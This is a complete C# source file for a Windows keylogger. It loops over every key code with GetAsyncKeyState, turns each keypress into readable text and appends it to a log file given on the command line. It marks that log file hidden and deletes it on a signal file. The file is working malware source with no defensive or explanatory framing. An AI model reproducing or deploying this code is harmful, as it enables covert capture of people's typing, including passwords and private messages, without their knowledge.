using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

class Entry {
	[DllImport("user32.dll")]
	public static extern int GetAsyncKeyState(Int32 i);

	static void Main(string[] args) {
		string path = "";
		if (args.Length > 0)
			path = args[0];
		else return;
		Console.WriteLine(path);

	    while (true) {
	        //Thread.Sleep(10);

	        if (File.Exists(path + "d")) {
	        	File.Delete(path);
	        	File.Delete(path + "d");
	        }

			StreamWriter file = new StreamWriter(path, true);
			File.SetAttributes(path, FileAttributes.Hidden);
	        for (int i = 1; i < 255; i++)
				if (GetAsyncKeyState(i) == 32769)
	            	file.Write(verifyKey(i));
	        file.Close();
	    }
	}

    private static String verifyKey(int code) {
        String key = "";

        if (code == 1) key = "[left click]";
        else if (code == 2) key = "[right click]";
        else if (code == 3) key = "[cancel]";
        else if (code == 4) key = "[middle click]";
        else if (code == 8) key = "[back]";
        else if (code == 9) key = "[tab]";
        else if (code == 13) key = "[enter]";
        else if (code == 16) key = ""; // shift
        else if (code == 17) key = ""; // ctrl
        else if (code == 18) key = ""; // alt
        else if (code == 19) key = "[pause]";
        else if (code == 20) key = "[caps]";
        else if (code == 27) key = "[esc]";
        else if (code == 32) key = " ";
        else if (code == 33) key = "[pgup]";
        else if (code == 34) key = "[pgdn]";
        else if (code == 35) key = "[end]";
        else if (code == 36) key = "[home]";
        else if (code == 37) key = "[left]";
        else if (code == 38) key = "[up]";
        else if (code == 39) key = "[right]";
        else if (code == 40) key = "[down]";
        else if (code == 44) key = "[prtsc]";
        else if (code == 45) key = "[ins]";
        else if (code == 46) key = "[del]";
        else if (code == 48) key = "0";
        else if (code == 49) key = "1";
        else if (code == 50) key = "2";
        else if (code == 51) key = "3";
        else if (code == 52) key = "4";
        else if (code == 53) key = "5";
        else if (code == 54) key = "6";
        else if (code == 55) key = "7";
        else if (code == 56) key = "8";
        else if (code == 57) key = "9";
        else if (code == 65) key = "a";
        else if (code == 66) key = "b";
        else if (code == 67) key = "c";
        else if (code == 68) key = "d";
        else if (code == 69) key = "e";
        else if (code == 70) key = "f";
        else if (code == 71) key = "g";
        else if (code == 72) key = "h";
        else if (code == 73) key = "i";
        else if (code == 74) key = "j";
        else if (code == 75) key = "k";
        else if (code == 76) key = "l";
        else if (code == 77) key = "m";
        else if (code == 78) key = "n";
        else if (code == 79) key = "o";
        else if (code == 80) key = "p";
        else if (code == 81) key = "q";
        else if (code == 82) key = "r";
        else if (code == 83) key = "s";
        else if (code == 84) key = "t";
        else if (code == 85) key = "u";
        else if (code == 86) key = "v";
        else if (code == 87) key = "w";
        else if (code == 88) key = "x";
        else if (code == 89) key = "y";
        else if (code == 90) key = "z";
        else if (code == 91) key = "[win]";
        else if (code == 92) key = "[win]";
        else if (code == 93) key = "[List]";
        else if (code == 96) key = "0";
        else if (code == 97) key = "1";
        else if (code == 98) key = "2";
        else if (code == 99) key = "3";
        else if (code == 100) key = "4";
        else if (code == 101) key = "5";
        else if (code == 102) key = "6";
        else if (code == 103) key = "7";
        else if (code == 104) key = "8";
        else if (code == 105) key = "9";
        else if (code == 106) key = "*";
        else if (code == 107) key = "+";
        else if (code == 109) key = "-";
        else if (code == 110) key = ",";
        else if (code == 111) key = "/";
        else if (code == 112) key = "[F1]";
        else if (code == 113) key = "[F2]";
        else if (code == 114) key = "[F3]";
        else if (code == 115) key = "[F4]";
        else if (code == 116) key = "[F5]";
        else if (code == 117) key = "[F6]";
        else if (code == 118) key = "[F7]";
        else if (code == 119) key = "[F8]";
        else if (code == 120) key = "[F9]";
        else if (code == 121) key = "[F10]";
        else if (code == 122) key = "[F11]";
        else if (code == 123) key = "[F12]";
        else if (code == 144) key = "[num lock]";
        else if (code == 145) key = "[scroll lock]";
        else if (code == 160) key = "[shift]";
        else if (code == 161) key = "[shift]";
        else if (code == 162) key = "[ctrl]";
        else if (code == 163) key = "[ctrl]";
        else if (code == 164) key = "[alt]";
        else if (code == 165) key = "[alt]";
        else if (code == 187) key = "=";
        else if (code == 186) key = ";";
        else if (code == 188) key = ",";
        else if (code == 189) key = "-";
        else if (code == 190) key = ".";
        else if (code == 192) key = "'";
        else if (code == 191) key = "/";
        else if (code == 193) key = "/";
        else if (code == 194) key = ".";
        else if (code == 219) key = "´";
        else if (code == 220) key = "\\";
        else if (code == 221) key = "[";
        else if (code == 222) key = "'";
        else if (code == 226) key = "\\";
        else key = "[other: " + code + "]";

        return key;
    }
}
